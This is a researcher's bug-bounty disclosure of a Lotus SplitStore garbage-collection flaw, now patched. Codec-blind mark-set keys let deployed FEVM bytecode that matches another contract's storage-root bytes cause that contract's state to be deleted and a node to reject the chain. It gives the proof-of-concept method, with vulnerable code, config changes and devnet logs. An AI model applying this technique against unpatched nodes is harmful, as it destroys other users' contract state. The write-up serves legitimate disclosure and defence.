# Filecoin SplitStore: From a Multihash Collision to Permanent State Loss and Node-Level Chain Divergence

**Target:** [filecoin-project/lotus](https://github.com/filecoin-project/lotus)  
**Affected version:** Lotus v1.36.2  
**Report:** Immunefi #89712  
**Reported:** August 20, 2026  
**Reported severity:** Critical  
**Accepted severity:** Medium  
**Bounty:** $4,750  
**Fix:** [PR #13848](https://github.com/filecoin-project/lotus/pull/13848), released in v1.37.0

## Overview

On August 20, 2026, I reported a vulnerability in Lotus's SplitStore garbage collector that allowed an unprivileged FEVM user to cause the deletion of another contract's chain-reachable storage.

The bug was a disagreement between how SplitStore identified visited objects and how it decided whether to traverse them. The mark set was keyed by `cid.Hash()`, which excludes the CID codec, but `walkObject` used the codec to decide whether it should scan an object's links. Worse, it marked before checking the codec.

This meant raw and DAG-CBOR blocks containing identical bytes competed for the same mark-set entry. If the raw block won, the DAG-CBOR block could be treated as visited and its descendants skipped.

The FEVM made this permissionlessly reachable. Contract bytecode is stored as raw IPLD, while contract storage is DAG-CBOR. Both use Blake2b-256. I could deploy bytecode identical to another contract's storage-root bytes, then let compaction delete its unmarked descendants.

I demonstrated deletion of a contract's own state with a surviving non-colliding control, cross-actor deletion causing `SysFatal(10)` during normal `InvokeContract` execution, and two-node divergence in which a default-discard node rejected subsequent blocks due to a computed state-root mismatch. Filecoin confirmed the root cause but disputed the determinism and the consensus impact, classified it as Medium, and paid $4,750.

## 1. Root cause

### 1.1 Mark-set keys discarded the codec

The Badger implementation used `c.Hash()` instead of the full CID:

```go
// blockstore/splitstore/markset_badger.go:146
write, seqno := s.put(string(c.Hash()))

// lines 177, 189
key := c.Hash()

// line 288
key := string(c.Hash())
```

The map implementation followed the same pattern:

```go
// blockstore/splitstore/markset_map.go:161,186,229
hash := c.Hash()
```

Thus `CID(codec=0x55, multihash=H(X))` and `CID(codec=0x71, multihash=H(X))` shared one mark-set key even though only the latter was traversable as DAG-CBOR. Multihash liveness tracking is reasonable; using that same bit to represent codec-sensitive traversal is not.

### 1.2 `walkObject` marked before deciding whether to scan

In `blockstore/splitstore/splitstore_compact.go:1144-1182`:

```go
if err := f(c); err != nil {
    if err == errStopWalk {
        return sz, nil
    }
    return 0, err
}

if c.Prefix().Codec != cid.DagCBOR {
    return sz, nil
}
// s.view(c, ...); cbg.ScanForLinks(...); recurse
```

The `f` callback in the compaction hot walk used `markSet.Visit`:

```go
fHot := func(c cid.Cid) error {
    if isUnitaryObject(c) {
        return errStopWalk
    }
    visit, err := markSet.Visit(c)
    if err != nil {
        return err
    }
    if !visit {
        return errStopWalk
    }
    atomic.AddInt64(count, 1)
    return nil
}
```

If `rawCID` arrives first, `markSet.Visit(rawCID)` stores the shared multihash, then `walkObject` returns at the codec check without scanning links. Later, `markSet.Visit(dagCBORCID)` returns false and `fHot` stops the walk before `ScanForLinks`. The DAG-CBOR root can still be retained while its reachable children go unmarked.

The unitary-object guard did not cover this:

```go
func isUnitaryObject(c cid.Cid) bool {
    switch c.Prefix().Codec {
    case cid.FilCommitmentSealed, cid.FilCommitmentUnsealed:
        return true
    default:
        return c.Prefix().MhType == mh.IDENTITY
    }
}
```

### 1.3 FEVM provides attacker-controlled codec aliases

The EVM actor's `set_bytecode` checked the 24,576-byte size limit and the `0xEF` prefix restriction, then stored the runtime as raw IPLD:

```rust
if bytecode.len() > MAX_CODE_SIZE { /* ... */ }
else if bytecode.first() == Some(&0xEF) { /* ... */ }

let cid = self.rt.store().put(
    Code::Blake2b256,
    &Block::new(IPLD_RAW, bytecode)
);
```

KAMT storage nodes were written with the same hash algorithm but DAG-CBOR codec:

```rust
store.put_cbor(node, Code::Blake2b256)
```

An EVM actor's State tuple contained `bytecode` at field 0 (`raw`, `0x55`), `bytecode_hash` at field 1, and `contract_state` at field 2 (`dag-cbor`, `0x71`). I could read the serialized storage root and deploy the same bytes as runtime bytecode. There was no Blake2b collision to break. The content was intentionally identical.

SplitStore walked parent state roots in compaction:

```go
if hdr.Height >= inclState || hdr.Height == 0 {
    sz, err := s.walkObject(hdr.ParentStateRoot, visitor, fHot)
}
```

## 2. Controlled self-collision PoC

I used the [Filecoin Audit Kit](https://github.com/FilecoinFoundationWeb/filecoin-audit-kit) with Lotus v1.36.2, commit `c6f4d02400dba55ebc5ab3677ef2ae5a5f4d1aef`, built with `-tags=2k`.

SplitStore matched the shipped defaults:

```toml
[ChainIndexer]
  EnableIndexer = true

[Chainstore]
  EnableSplitstore = true
  [Chainstore.Splitstore]
    ColdStoreType = "discard"
    HotStoreType = "badger"
    MarkSetType = "badger"
```

Only scheduling was accelerated for the short devnet. The marking, walking, and purging logic was untouched:

```diff
- upgradeBoundary = policy.ChainFinality
+ upgradeBoundary = policy.ChainFinality / 900

- CompactionThreshold = 5 * policy.ChainFinality
+ CompactionThreshold = policy.ChainFinality / 18

- CompactionBoundary = 4 * policy.ChainFinality
+ CompactionBoundary = policy.ChainFinality / 180

- CheckSyncGap = true
+ CheckSyncGap = false
```

I initialized two storage slots to `0xaa...aa` and `0xbb...bb` using KAMT settings `min_data_depth=0`, `bit_width=5`, `max_array_width=1`. This forced the root to contain a child CID. The 87-byte root was read from the actual devnet blockstore. I used those bytes as the attack contract's runtime, and deployed a separate non-colliding control with storage `0xcc...cc` and `0xdd...dd`.

Attack contract `f01004` had:

```text
bytecode (raw):
bafk2bzacea4dzwdtr7loj75jkqscbr7dxp2ncqaj44konxzqt5zxe47noo7ei

contract_state (dag-cbor):
bafy2bzacea4dzwdtr7loj75jkqscbr7dxp2ncqaj44konxzqt5zxe47noo7ei
```

The CIDs differed only by codec. Before compaction, both attack slots and both control slots were readable. At epoch 51:

```text
marking done:        marked=236
compaction stats:    hot=236 cold=0 purge=425
purged cold objects: purged=425
compaction done
```

After compaction:

```text
ATTACK child:
bafy2bzacebhlni5yp3vf3zdul4ycojxsbs5awgaky5psdawxjzogh2vpsyxha
GONE

CONTROL child:
bafy2bzacedsxz2bffuurugy3q2cr3xns4oleb3dz62wd4ywki77e42nlvlblw
PRESENT
```

The deleted child's digest `4eb6a3b87eea5de4745f302726f20cba0b180ac75f2182d74e5c63eaaf962e70` was still embedded in the reachable storage-root bytes. Direct reads returned `ipld: could not find`, and storage access yielded `SysFatal(10): missing reachable state`. The control retained both storage entries. This isolated the codec aliasing from ordinary aging or broad purging.

## 3. Cross-actor state deletion

The self-colliding runtime began with `0x82` (`DUP3`), which stack-underflows on execution. It demonstrated deletion but was not a useful execution victim.

I therefore deployed a normal victim whose runtime loaded storage slot zero and returned it:

```text
60005460005260206000f3
```

```text
60 00  PUSH1 0
54     SLOAD
60 00  PUSH1 0
52     MSTORE
60 20  PUSH1 32
60 00  PUSH1 0
f3     RETURN
```

The victim's storage root was:

```text
bafy2bzaced6gikown43cqx7gloys5h7rlurlanhbvgliopeymrcd5oemkmvtq
```

Its digest was `fc6429d66f36285fe65bb12e9ff15d22b034e1a996873c9864443eb88c532b38`. I read the root bytes with `lotus chain read-obj` and deployed shadow actors carrying the same bytes as raw bytecode. For shadow `f01014`, the code CID had the same digest as victim `f01007`'s DAG-CBOR storage root.

The victim's child was:

```text
bafy2bzacea2ucquxajkewtwx3uxj3qeh337z44rjuq274mrfd66wgt2v5vjym
```

Before compaction, `eth_call` returned `0x1111111111111111111111111111111111111111111111111111111111111111`. After a successful collision and compaction, the child was gone. The victim then returned:

```text
message execution failed (exit=[SysFatal(10)])
00: f01007 (method 3844450837) -- fatal error (10)
[FATAL] Error: missing reachable state:
bafy2bzacea2ucquxajkewtwx3uxj3qeh337z44rjuq274mrfd66wgt2v5vjym
```

Method `3844450837` is `InvokeContract`, the ordinary FEVM execution path, not a storage-only RPC. The damaged node also failed gas estimation for invocation and failed `lotus chain export --recent-stateroots=901` with an incomplete snapshot.

## 4. Two-node validation failure

I then ran two nodes using the same Lotus binary and chain, with one cold-storage policy difference:

```text
node0: ColdStoreType = "universal" (archival, miner)
node1: ColdStoreType = "discard"   (shipped default)
```

I deployed a victim with the same `SLOAD` runtime and ultimately 54 shadow actors. Before compaction, both nodes read the victim's child and executed it successfully. After `node1` compacted:

```text
node0 child: PRESENT
node1 child: GONE

node0 eth_call: 0x1111111111111111111111111111111111111111111111111111111111111111
node1 eth_call: SysFatal(10), missing reachable state
```

The nodes were still synchronized at height 294. I invoked the victim through the healthy node:

```bash
lotus evm invoke f01002 ""
```

```text
sending message...
waiting for message to execute...
Gas used: 2439572
1111111111111111111111111111111111111111111111111111111111111111
```

The healthy node included the transaction. `node1`, with missing state, failed while validating the chain. The FVM's missing-block path used:

```rust
.and_then(|b| b.ok_or_else(|| anyhow!("missing reachable state: {}", cid)))
.or_fatal()?;
```

State computation appended message receipts:

```go
receipts = append(receipts, &r.MessageReceipt)
```

And Lotus compared the locally computed state with the header commitment:

```go
if stateroot != h.ParentStateRoot {
    return xerrors.Errorf(
        "parent state root did not match computed state (%s != %s)",
        stateroot,
        h.ParentStateRoot,
    )
}
```

The captured heights were:

| Elapsed | node0 | node1 |
|---|---:|---:|
| Before invoke | 294 | 294 |
| 15 seconds | 296 | 295 |
| 60 seconds | 300 | 295 |
| 120 seconds | 304 | 295 |
| 180 seconds | 309 | 295 |
| 240 seconds | 313 | 295 |
| 300 seconds | 317 | 295 |
| 360 seconds | 322 | 295 |

The final captured run showed `node0` at 323 and `node1` at 295. The latter reported:

```text
Stage: error
Error: chain linked to block marked previously as bad

parent state root did not match computed state
(bafy2bzacebsym2bon5yswohwlqh3pucceu5qxzj4rc3ykhrmxgzqhzl2qgfxi
 != bafy2bzacecjlv4mdvuu5nfjhqvf4zlyjq2yzcndgqpldzgicds2dwldp66aoo)

chain/consensus/common.go:120
```

This was not merely an RPC failure or a slow synchronizer. The node rejected the valid chain because the state it recomputed from its incomplete local store did not match the committed state root. This demonstrates node-level validation divergence in the two-node devnet, not proof of a production mainnet-wide halt or a hard fork.

## 5. Traversal ordering and reliability

My initial report gave `P(success) = k/(k+1)` for `k` shadows. I corrected that in the same day's follow-up. Under a simplified serial-walk model in which each shadow independently precedes the victim with probability `p`, the expression is:

```text
P(at least one earlier shadow) = 1 - (1 - p)^k
```

The state-tree HAMT uses Murmur3 for actor IDs. But Filecoin correctly noted that the actual SplitStore walk is multigoroutine, with worker count related to CPU count. Race scheduling affects which codec reaches the mark set first. Neither simple formula is an exact guarantee for production nodes. The cross-actor run succeeded with 26 shadows, while the two-node case used 54. The demonstrated property is that ordinary deployments could supply more competing raw references, not a fixed exploit probability against arbitrary machines.

## 6. Filecoin's response

On September 22, Filecoin confirmed the root cause: a bare-multihash mark set combined with marking before the codec check could suppress DAG-CBOR traversal and cause missed descendants. They disputed determinism because of the parallel walk, and disputed the claimed consensus impact. Their view was that the canonical chain stayed valid and unaffected nodes could continue executing, so the issue was local state degradation, not a network split.

The canonical chain did remain valid and the archival node continued. My disagreement is about the validation behavior of the damaged node. I observed two synchronized nodes at height 294, then one repeatedly reject the valid chain with a parent-state-root mismatch while the other advanced. Those are the recorded devnet observations. Whether they meet Immunefi's definition of a Critical chain-split impact is a separate severity decision. Filecoin classified the report as Medium and paid $4,750.

## 7. The fix

Filecoin fixed the issue in [PR #13848](https://github.com/filecoin-project/lotus/pull/13848), merged October 2 and released in [Lotus v1.37.0](https://github.com/filecoin-project/lotus/releases/tag/v1.37.0) on October 6.

Rather than indiscriminately keying every liveness mark by the full CID, the fix separated multihash-based content liveness from codec-aware link-traversal bookkeeping. The new `liveMarkSet` and codec-aware scanning behavior prevented a raw alias from consuming the DAG-CBOR traversal state. Changes covered compaction, pruning, warmup, and checking paths, with tests for codec aliasing and concurrent marking.

I have not rerun the complete two-node PoC against the fixed release. The remediation assessment here follows the upstream patch and its regression coverage.

## Conclusion

The bug came from using content identity as traversal identity. For liveness, identical multihashes may reasonably indicate identical bytes. For graph traversal, the codec matters because identical bytes can have different link semantics.

The FEVM exposed that mismatch through permissionlessly deployable raw bytecode. I reproduced deletion of a chain-reachable child, proved that a non-colliding control survived, showed `InvokeContract` hitting `SysFatal(10)` for a third-party contract, and observed a node stop following a valid chain after locally deleting required state.

Garbage collection is part of a blockchain client's security boundary. When its reachability model diverges from execution semantics, local data loss can propagate to block validation.

**Reported August 20, 2026. Fixed in Lotus v1.37.0. Paid October 28, 2026.**

## References

1. [Lotus repository](https://github.com/filecoin-project/lotus)
2. [Affected commit](https://github.com/filecoin-project/lotus/tree/c6f4d02400dba55ebc5ab3677ef2ae5a5f4d1aef)
3. [Vulnerable compaction implementation](https://github.com/filecoin-project/lotus/blob/c6f4d02400dba55ebc5ab3677ef2ae5a5f4d1aef/blockstore/splitstore/splitstore_compact.go)
4. [Vulnerable Badger mark set](https://github.com/filecoin-project/lotus/blob/c6f4d02400dba55ebc5ab3677ef2ae5a5f4d1aef/blockstore/splitstore/markset_badger.go)
5. [Vulnerable map mark set](https://github.com/filecoin-project/lotus/blob/c6f4d02400dba55ebc5ab3677ef2ae5a5f4d1aef/blockstore/splitstore/markset_map.go)
6. [Filecoin Audit Kit](https://github.com/FilecoinFoundationWeb/filecoin-audit-kit)
7. [Fix PR #13848](https://github.com/filecoin-project/lotus/pull/13848)
8. [Lotus v1.37.0](https://github.com/filecoin-project/lotus/releases/tag/v1.37.0)
9. [Immunefi Responsible Publication](https://immunefi.com/responsible-publication/)
